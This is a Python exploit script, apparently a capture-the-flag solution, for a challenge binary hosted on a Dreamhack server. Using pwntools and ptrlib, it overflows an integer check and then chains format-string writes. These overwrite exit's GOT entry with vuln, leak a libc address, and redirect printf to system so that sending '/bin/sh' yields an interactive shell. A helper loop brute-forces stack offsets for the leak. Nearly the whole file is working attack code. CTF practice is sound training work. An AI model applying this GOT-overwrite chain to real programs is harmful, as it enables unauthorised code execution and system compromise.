#!/usr/bin/env python
import sys
import ptrlib as ptr
import pwn

exe = ptr.ELF("./chall")
# exe = ptr.ELF("./chall_patched")
pwn.context.binary = pwn.ELF(exe.filepath)
libc = ptr.ELF("./libc.so.6")


remote = False
if len(sys.argv) > 1 and sys.argv[1] == "remote":
    remote = True


def connect():
    if remote:
        return pwn.remote("host3.dreamhack.games", 20598)
        # return pwn.remote("localhost", 28966)
    else:
        return pwn.process(exe.filepath)


def unwrap(x):
    if x is None:
        ptr.logger.error("Failed to unwrap")
        exit(1)
    else:
        return x


def dump():
    dump = ""
    for i in range(200):
        io = connect()

        io.sendlineafter(b"num1 : ", b"2147483640")
        io.sendlineafter(b"num2 : ", b"10")

        def send_fsb_payload(payload: bytes):
            assert len(payload) <= 0x82
            if len(payload) == 0x82:
                io.sendafter(b"you?? : ", payload)
            else:
                io.sendlineafter(b"you?? : ", payload)

        # fsb1 exit -> vuln
        payload = b""
        payload += pwn.fmtstr_payload(12, {exe.got("exit"): exe.symbol("vuln")})
        send_fsb_payload(payload)

        # fsb2 libc leak
        payload = b"A" * 8
        payload += f"#%{i}$lx#".encode()
        send_fsb_payload(payload)
        io.recvuntil(b"#")
        leak = io.recvuntil(b"#", drop=True)
        dump += f"{i}: 0x{leak.decode()}\n"
        io.close()

    with open("./dump.txt", "w") as file:
        file.write(dump)

    # io.interactive()
    return


def main():
    io = connect()

    io.sendlineafter(b"num1 : ", b"2147483640")
    io.sendlineafter(b"num2 : ", b"10")

    def send_fsb_payload(payload: bytes):
        assert len(payload) <= 0x82
        if len(payload) == 0x82:
            io.sendafter(b"you?? : ", payload)
        else:
            io.sendlineafter(b"you?? : ", payload)

    # fsb1 exit -> vuln
    payload = b""
    payload += pwn.fmtstr_payload(12, {exe.got("exit"): exe.symbol("vuln")})
    send_fsb_payload(payload)

    # fsb2 libc leak
    payload = b""
    payload += b"#%45$lx#"
    send_fsb_payload(payload)
    io.recvuntil(b"#")
    leak = int(io.recvuntil(b"#", drop=True), 16)
    print(f"libc_addr: {hex(leak)}")
    libc.base = leak - 0x7F410

    # fsb3 printf -> system
    payload = b""
    payload += pwn.fmtstr_payload(12, {exe.got("printf"): libc.symbol("system")})
    send_fsb_payload(payload)

    io.sendline(b"/bin/sh")

    io.interactive()
    return


if __name__ == "__main__":
    # main()
    dump()
